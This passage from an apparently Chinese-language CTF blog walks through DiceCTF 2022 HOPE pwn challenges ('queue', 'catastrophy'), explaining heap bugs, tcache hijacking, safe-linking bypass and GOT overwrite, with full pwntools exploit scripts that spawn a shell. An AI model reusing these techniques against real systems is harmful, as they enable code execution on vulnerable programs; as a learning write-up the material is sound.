*0x401159&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span> * (<span class="number">64</span>+<span class="number">8</span>) + raw_rop)</span><br><span class="line">p.sendline(dlresolve.payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h1><p>很好的一道penverse题目(hhh感觉这个名字就很好)，考察到了ida修复跳表(虽然自7.7以后就没有这种事情了)，之后逆向堆块结构和功能。我觉得这是一道提好的新题。我自己做的时候也没找到洞在哪里，赛后看了wp复现的。简单来说这个题目是这样的。我们有以下这些功能。并且开局可以白送一个libc和堆地址。</p><p><img src="/2022/07/28/dice2022-hope/image-20220728205853934.png" alt="image-20220728205853934"></p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>一个queue的结构体如下。这里的cur_size是当前大小，size_bound是初始为4，之后每次到达都会倍增的大小。代表了这个queue的总大小。倍增的相关函数是realloc。</p><p><img src="/2022/07/28/dice2022-hope/image-20220728210907953.png" alt="image-20220728210907953"></p><h2 id="create"><a href="#create" class="headerlink" title="create"></a>create</h2><p>这里create功能如下</p><p><img src="/2022/07/28/dice2022-hope/image-20220728211037699.png" alt="create"></p><p>create是创建一个queue。初始化设置size_bound并且放置好函数指针。并且设置cur_size为0。</p><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>接下来看free功能</p><p><img src="/2022/07/28/dice2022-hope/image-20220728211844367.png" alt="free7"></p><p>free非常简单，把自身queue首位置清除，再把整个queue清除。并且在外面把存放queue的数组对应位置清零了。</p><h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><p>接下来看queue中的push</p><p><img src="/2022/07/28/dice2022-hope/image-20220728212122202.png" alt="image-20220728212122202"></p><p>首先检查push之后是不是会越界，如果是就先改变queue的大小，之后相当于把queue中每个元素和现在输入进来的做一个比较，然后整个queue按照字符从大到小顺序排序。把content_ptr(利用strdup生成的输入的字符串申请的堆)写在queue中。</p><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p><img src="/2022/07/28/dice2022-hope/image-20220728212412545.png" alt="image-20220728212412545"></p><p><img src="/2022/07/28/dice2022-hope/image-20220728212425523.png" alt="image-20220728212425523"></p><p>pop就是删除数据。不过这里free了数据之后似乎没有清除原先的指针。但是由于libc是2.31的，2.31下没有edit的UAF还是比较困难的(我觉得)</p><h2 id="compact"><a href="#compact" class="headerlink" title="compact"></a>compact</h2><p>最后一个操作时compact。</p><p><img src="/2022/07/28/dice2022-hope/image-20220728213335820.png" alt="image-20220728213335820"></p><p>这个操作将原先queue留有的缓冲大小清空，realloc到他需要的真实大小。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>这里的漏洞还是挺隐蔽的..我一开始没有想到。具体来说是这样的。首先我们注意到新创建的一个queue，真实大小为0，预先开辟的大小为8，如果我们此时使用compact，就可以把这个块free掉，并且把<code>size_bound</code>字段也写成0(compact第一步干的事)</p><p>在这之后如果巧妙控制堆空间，可以使得后面对0添加数据的时候，ptr不断向后加，并且不会触发queue的增大(因为必须是cur_size == size_bound才行)这样会导致我们写入的字符串的指针覆盖到别的地方</p><p><img src="/2022/07/28/dice2022-hope/image-20220728214410981.png" alt="image-20220728214410981"></p><p>之后我们如果再申请一个块(和0x30不同大小)，就会把地址写到0x55b11e1893f0这个地方。注意如果我们此时申请一个块，fd位置写上free_hook，<strong>就可以完成对这个tcache链的劫持</strong>(很有意思的想法，之前还没有碰到过)如下图所示。</p><p><img src="/2022/07/28/dice2022-hope/image-20220728214942286.png" alt="新放入的块"></p><p><img src="/2022/07/28/dice2022-hope/image-20220728214854563.png" alt="image-20220728214854563"></p><p>之后就是常规操作了。这里比较难的就是：<strong>由于我们只能操纵任意地址写一个指针，可能没有思路，而一个解决办法就是直接写到tcache链上</strong>。不过也可能有别的解法，比方说覆盖函数指针等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./queue&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/home/nicholas/glibc-all-in-one/libs/libc6_2.31_0ubuntu9.2_amd64/libc-2.31.so&quot;</span></span><br><span class="line">r = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">  r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx</span>):</span><br><span class="line">  r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">idx, item</span>):</span><br><span class="line">  r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  r.send(item)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">idx</span>):</span><br><span class="line">  r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compact</span>(<span class="params">idx</span>):</span><br><span class="line">  r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queue_dbg</span>(<span class="params">idx</span>):     </span><br><span class="line">  r.sendline(<span class="string">b&#x27;69&#x27;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;brva 0x1A07\n&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;brva 0x1408\n&quot;</span> <span class="comment"># realloc in push</span></span><br><span class="line">    gdb.attach(r,cmd)</span><br><span class="line">    queue_dbg(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>)</span><br><span class="line">queue_dbg(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">heap_info = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">heap_base = heap_info - <span class="number">0x2d0</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;cmp: &#x27;</span>)</span><br><span class="line">libc_info = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = libc_info - <span class="number">0x186b60</span></span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">success(<span class="string">&quot;libc_base; &quot;</span>+ <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">compact(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">push(<span class="number">0</span>,<span class="string">b&quot;~&quot;</span>*<span class="number">31</span>)</span><br><span class="line">push(<span class="number">1</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">31</span>)</span><br><span class="line">push(<span class="number">1</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">31</span>)</span><br><span class="line">push(<span class="number">1</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">31</span>)</span><br><span class="line">push(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">31</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pop(<span class="number">1</span>)</span><br><span class="line">pop(<span class="number">1</span>)</span><br><span class="line">pop(<span class="number">1</span>)</span><br><span class="line">pop(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># debug() check point 1</span></span><br><span class="line">push(<span class="number">0</span>, <span class="string">b&#x27;&#125;\n&#x27;</span>)</span><br><span class="line">push(<span class="number">0</span>, <span class="string">b&#x27;|\n&#x27;</span>)</span><br><span class="line">push(<span class="number">0</span>, <span class="string">b&#x27;&#123;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug() # check point 2</span></span><br><span class="line">push(<span class="number">0</span>, p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_base - <span class="number">31</span> + <span class="number">6</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">push(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">31</span>)</span><br><span class="line">push(<span class="number">1</span>, <span class="string">b&#x27;/bin/sh;&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">31</span>-<span class="number">8</span>))</span><br><span class="line">push(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">31</span> - <span class="number">6</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base))</span><br><span class="line">debug()</span><br><span class="line">pop(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="catastrophy"><a href="#catastrophy" class="headerlink" title="catastrophy"></a>catastrophy</h1><p>很简单的程序，但是libc是2.35的。只有add delete view三个功能，并且一个直接的UAF。</p><p>使用readelf -a ./libc.so.6并且查找build id相关内容可以找到以下数据</p><p><img src="/2022/07/28/dice2022-hope/image-20220729161048293.png" alt="image-20220729161048293"></p><p>之后找到89开头的build_id</p><p>（我这里是先使用glibc_all_in_one的extract解压失败，到tmp文件夹中找到的路径：/tmp/tmp.qqEYlAhqsU/usr/lib/debug/.build-id）其实也就是正常解压得到的结果。</p><p><img src="/2022/07/28/dice2022-hope/image-20220729161208355.png" alt="image-20220729161208355"></p><p>之后将89开头的文件内容复制到/usr/lib/debug/.build-id中89开头的文件夹下面，如果没有自己创建一个名字是89的文件夹。就可以使用诸如parseheap(缩写为par)以及heapinfo等堆调试方式了。但是bins和heap依然无法使用。这题给出了利用2.35下heap的两个方法，一个是fastbin reverse into tcache，另一个是FSOP，这次都可以借鉴学习一下。</p><h2 id="方法一-fastbin"><a href="#方法一-fastbin" class="headerlink" title="方法一: fastbin"></a>方法一: fastbin</h2><p>首先我们熟悉safe linking机制是什么，<a href="http://blog.nsfocus.net/glibc-234/">这篇博客</a>简要介绍了safe linking机制。简单来说就是tcache中的bk字段不再是一个简单的地址，而是一个异或之后的数据。</p><p>我们可以先利用show和UAF直接得到堆地址和libc基地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    malloc(i,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">heap_info = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">1</span></span><br><span class="line">heap_info = (heap_info&lt;&lt;<span class="number">12</span>)</span><br><span class="line">success(<span class="string">&quot;heap_info: &quot;</span>+ <span class="built_in">hex</span>(heap_info))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># into uns</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>之后创建九个0x30大小的chunk，free掉7个填满tcache，<strong>剩下两个块在fastbin中完成攻击</strong>。可以free(7)再free(8)再free(7)。这样简单的针对fastbin的攻击在高版本glibc中依然是有效的。此时tcache状态为满，fastbin中有三个块。<strong>我们的核心思想就是通过提出fastbin中的第一个块，同时写入内容，这样就能引入一个任意地址的堆分配</strong>。接下来利用<a href="https://nicholas-wei.github.io/2022/02/23/fastbin-reverse-into-tcache/">fastbin reverser into tcache</a>把这个地址分配进入tcache。之后写入system(“/bin/sh”)。</p><p>但是没有了hook，我们可以写入什么呢？这道题开辟了一个新的角度，也就是写libc的got。**这里写的就是puts中调用的strlen()的got。具体来说，通过如下方式查找。</p><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>首先进入距离Puts最近的一个call。这里其实是strlen()。我们si进去。利用的断点指令就是b puts</p><p><img src="/2022/07/28/dice2022-hope/image-20220731124608414.png" alt="image-20220731124608414"></p><h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>si进去之后能够看到这样的函数。注意到strlen。我们搜索这个地址。</p><p><img src="/2022/07/28/dice2022-hope/image-20220731124738534.png" alt="image-20220731124738534"></p><p><img src="/2022/07/28/dice2022-hope/image-20220731124807786.png" alt="image-20220731124807786"></p><p>这个地址就是strlen的GOT表项。</p><h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p><img src="/2022/07/28/dice2022-hope/image-20220731124911408.png" alt="image-20220731124911408"></p><p>注意2.35中检查了chunk是否对齐，因此我们只能将90开头的两个GOT同时修改。前一个恢复成保持不变的即可。当然这里直接改成system也不影响。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./catastrophe&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size,con</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index?&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size?&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Enter content: &#x27;</span>)</span><br><span class="line">    io.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index?&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index?&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;brva 0x14B5&quot;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap and libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    malloc(i,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">heap_info = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">1</span></span><br><span class="line">heap_info = (heap_info&lt;&lt;<span class="number">12</span>)</span><br><span class="line">success(<span class="string">&quot;heap_info: &quot;</span>+ <span class="built_in">hex</span>(heap_info))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># into uns</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    malloc(i,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">malloc(<span class="number">8</span>,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># success(&quot;libc_got: &quot;+ hex(0x219098+libc_base))</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># allocate 10 tcache 0x30 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    malloc(i,<span class="number">0x28</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 7 0x30 tcache chunks, to fill tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key_0x30 = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">key_0x30 = key_0x30 &lt;&lt; <span class="number">12</span> <span class="comment"># current tcache head</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>): <span class="comment"># 0 to 6</span></span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free in fastbin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># free tcache 0x30 line</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache reverse into fastbin</span></span><br><span class="line">target = libc_base + <span class="number">0x219090</span></span><br><span class="line">success(<span class="string">&quot;target: &quot;</span> + <span class="built_in">hex</span>(target))</span><br><span class="line">write1 = libc_base + <span class="number">0x19f1c0</span></span><br><span class="line">success(<span class="string">&quot;write1: &quot;</span> + <span class="built_in">hex</span>(write1))</span><br><span class="line">enc_target = (target)^(key_0x30&gt;&gt;<span class="number">12</span>) <span class="comment"># target libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b puts&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse into tcache</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x28</span>,p64(enc_target)+p64(heap_info+<span class="number">0x10</span>)) <span class="comment"># add into last</span></span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x28</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># malloc(3,0x28,p64(libc_address+0x19f1c0)+ p64(libc.sym[&#x27;system&#x27;]))</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b malloc&quot;)</span></span><br><span class="line"><span class="comment"># malloc(3,0x28,p64(write1)+ p64(libc.sym[&#x27;system&#x27;]+libc_base))</span></span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x28</span>,<span class="number">2</span>*p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base))</span><br><span class="line">io.clean()</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.clean()</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>) <span class="comment"># stelen(&quot;/bin/sh&quot;)</span></span><br><span class="line">io.clean()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/07/28/dice2022-hope/image-20220731125114497.png" alt="image-20220731125114497"></p><p>注意这里使用io.clean()可以不让io输出多于内容。</p><h2 id="方法二：FSOP"><a href="#方法二：FSOP" class="headerlink" 